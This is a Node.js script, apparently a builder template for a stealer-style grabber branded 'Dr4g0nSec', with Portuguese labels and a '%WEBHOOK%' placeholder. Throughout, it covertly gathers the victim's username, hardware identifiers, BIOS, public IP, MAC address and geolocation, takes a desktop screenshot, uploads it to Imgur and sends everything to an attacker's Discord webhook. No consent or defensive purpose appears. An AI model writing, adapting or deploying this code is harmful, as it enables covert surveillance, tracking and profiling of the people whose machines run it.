const os = require('os');
const { execSync } = require('child_process');
const axios = require('axios');
const screenshot = require('screenshot-desktop');
const FormData = require('form-data');
const fs = require('fs');
const path = require('path');

const H00K3_URL = "%WEBHOOK%";


async function uploadToImgur(filePath) {
    const image = fs.readFileSync(filePath, { encoding: 'base64' });
    const response = await axios.post('https://api.imgur.com/3/upload', {
        image: image,
        type: 'base64'
    }, {
        headers: {
            Authorization: 'Client-ID fc777d63b5c36b5'
        }
    });

    return response.data.success ? response.data.data.link : null;
}

function getHWID() {
    try {
        return execSync('wmic csproduct get uuid').toString().split('\n')[1].trim();
    } catch {
        return 'Não Encontrado.';
    }
}

function getMotherboard() {
    try {
        return execSync('wmic baseboard get product').toString().split('\n')[1].trim();
    } catch {
        return 'Não Encontrado.';
    }
}

function getBIOS() {
    try {
        return execSync('wmic bios get smbiosbiosversion').toString().split('\n')[1].trim();
    } catch {
        return 'Não Encontrado.';
    }
}

function getSound() {
    try {
        return execSync('wmic sounddev get name').toString().split('\n')[1].trim();
    } catch {
        return 'Não Encontrado.';
    }
}

function getUserInfo() {
    return os.userInfo().username;
}

async function takeScreenshot() {
    const filepath = path.join(os.tmpdir(), 'screenshot.png');
    await screenshot({ filename: filepath });
    return filepath;
}

async function getNetworkInfo() {
    try {
        const ip = (await axios.get("https://api.ipify.org")).data;
        const r = (await axios.get(`https://ipinfo.io/${ip}/json`)).data;

        return {
            ip,
            hostname: os.hostname(),
            mac: getMacAddress(),
            country: r.country || "Não Encontrado.",
            region: r.region || "Não Encontrado.",
            city: r.city || "Não Encontrado.",
            isp: r.org || "Não Encontrado."
        };
    } catch {
        return {
            ip: "Não Encontrado.",
            hostname: os.hostname(),
            mac: getMacAddress(),
            country: "Não Encontrado.",
            region: "Não Encontrado.",
            city: "Não Encontrado.",
            isp: "Não Encontrado."
        };
    }
}

function getMacAddress() {
    const interfaces = os.networkInterfaces();
    for (const iface of Object.values(interfaces)) {
        for (const config of iface) {
            if (!config.internal && config.mac && config.mac !== '00:00:00:00:00:00') {
                return config.mac;
            }
        }
    }
    return 'Não Encontrado.';
}

async function sendToWebhook(user, sysInfo, netInfo, screenshotUrl) {
    const embed = {
        title: "Informações Do Sistema",
        color: 0x250e80,
        fields: [
            {
                name: "<:user:1378150229769060422> Usuário",
                value: `\`\`\`Nome: ${user}\nSistema: ${netInfo.hostname}\nUsuário: ${user}\`\`\``,
                inline: false
            },
            {
                name: "<:world:1378143049288253460> Rede",
                value: `\`\`\`IP: ${netInfo.ip}\nMAC: ${netInfo.mac}\nISP: ${netInfo.isp}\nRegião: ${netInfo.region} - ${netInfo.city}\`\`\``,
                inline: false
            },
            {
                name: "<:cpu1:1378078689601785876> Sistema",
                value: `\`\`\`CPU: ${sysInfo.cpu}\nRAM: ${sysInfo.ram}\nHWID: ${sysInfo.hwid}\nMotherboard: ${sysInfo.motherboard}\nBIOS: ${sysInfo.bios}\nSom: ${sysInfo.sound}\nOS: ${sysInfo.os}\`\`\``,
                inline: false
            }
        ],
        image: screenshotUrl ? { url: screenshotUrl } : undefined,
        footer: {
            text: "created by sk4rty | Dr4g0nSec on Top!",
            icon_url: "https://i.pinimg.com/736x/b2/d6/d7/b2d6d766dfa4f99bb325ac908c7ed12d.jpg"
        }
    };

    await axios.post(H00K3_URL, {
        username: "Dr4g0nSec | Informações do Sistema",
        avatar_url: "https://i.imgur.com/83uCFZe.jpeg",
        embeds: [embed]
    });
}

(async () => {
    const user = getUserInfo();
    const sysInfo = {
        cpu: os.cpus()[0].model,
        ram: `${Math.round(os.totalmem() / (1024 ** 3))} GB`,
        hwid: getHWID(),
        motherboard: getMotherboard(),
        bios: getBIOS(),
        sound: getSound(),
        os: `${os.type()} ${os.release()}`
    };
    const netInfo = await getNetworkInfo();
    const screenshotPath = await takeScreenshot();
    const screenshotUrl = await uploadToImgur(screenshotPath);
    await sendToWebhook(user, sysInfo, netInfo, screenshotUrl);
})();
